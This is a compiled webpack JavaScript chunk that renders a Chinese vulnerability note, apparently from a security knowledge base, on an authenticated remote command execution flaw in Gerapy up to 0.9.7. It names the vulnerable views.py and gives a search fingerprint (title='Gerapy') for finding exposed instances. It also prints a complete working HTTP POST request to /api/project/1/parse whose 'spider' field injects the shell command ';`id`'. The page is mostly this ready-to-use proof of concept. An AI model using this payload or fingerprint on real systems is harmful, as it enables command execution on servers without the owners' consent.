(window.webpackJsonp=window.webpackJsonp||[]).push([[166],{1760:function(t,s,a){t.exports=a.p+"assets/img/1638069254477-82075ea9-6191-4ebd-8e92-bed0104a0942-20220313132256739.2665b636.png"},1761:function(t,s,a){t.exports=a.p+"assets/img/1638185162093-04fc1593-86b0-4c91-b8d3-32ae22fc224d.f0fffaf6.png"},1762:function(t,s,a){t.exports=a.p+"assets/img/1638185190368-660687ff-2bb8-4251-8b66-811fca41ca9b.49e55a56.png"},2505:function(t,s,a){"use strict";a.r(s);var n=a(75),r=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"gerapy-parse-后台远程命令执行漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#gerapy-parse-后台远程命令执行漏洞"}},[t._v("#")]),t._v(" Gerapy parse 后台远程命令执行漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Gerapy gerapy/server/core/views.py 中的方法存在任意命令执行，攻击者登录后台后发送特定的请求包即可利用漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Gerapy <= 0.9.7")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('title="Gerapy"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("登录页面")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1760),alt:"img"}})]),t._v(" "),n("p",[t._v("出现漏洞的文件为 "),n("strong",[t._v("gerapy/server/core/views.py")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(1761),alt:"img"}})]),t._v(" "),n("p",[t._v("构造请求包测试命令执行")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("POST "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("project"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("parse HTTP"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nPragma"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" no"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("cache\nCache"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Control"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" no"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("cache\nAccept"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("json"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" text"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plain"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAuthorization"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Token 0fb31a60728efd8e6398349bea36fa7629bd8df0\nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Macintosh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Intel Mac OS X "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("10_15_7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("KHTML"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("96.0")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".4664")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".55")]),t._v(" Safari"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v("\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Language"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("CN"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("US"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.7")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("TW"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.6")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"spider"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('";`id`"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1762),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);